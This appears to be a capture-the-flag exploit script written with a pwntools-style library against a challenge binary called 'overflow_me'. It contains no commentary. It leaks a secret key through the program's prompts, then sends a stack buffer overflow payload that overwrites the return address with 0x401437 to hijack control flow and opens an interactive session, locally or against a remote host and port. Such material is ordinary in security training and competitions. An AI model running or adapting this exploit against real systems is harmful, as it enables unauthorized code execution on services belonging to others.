#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./overflow_me', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x4013E7
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

# ==================== EXPLOIT ====================
p = start()

# # 0x4040b8
sa(b'Tell me its address\n', p64(exe.sym.secret_key))

secret_key = int(rl()[:-1], 16)
info('secret_key = 0x{:x}'.format(secret_key))

sa(b'If you speak it, the story unlocks\n', p64(secret_key))

ru(b'It has something for you: ')
val = int(rl()[:-1], 16)
info('val = 0x{:x}'.format(val))

sla(b'Write yourself into this story.\n', b'A' * 0x40 + p64(val) + p64(0) * 2 + p64(0x401437))

interactive()
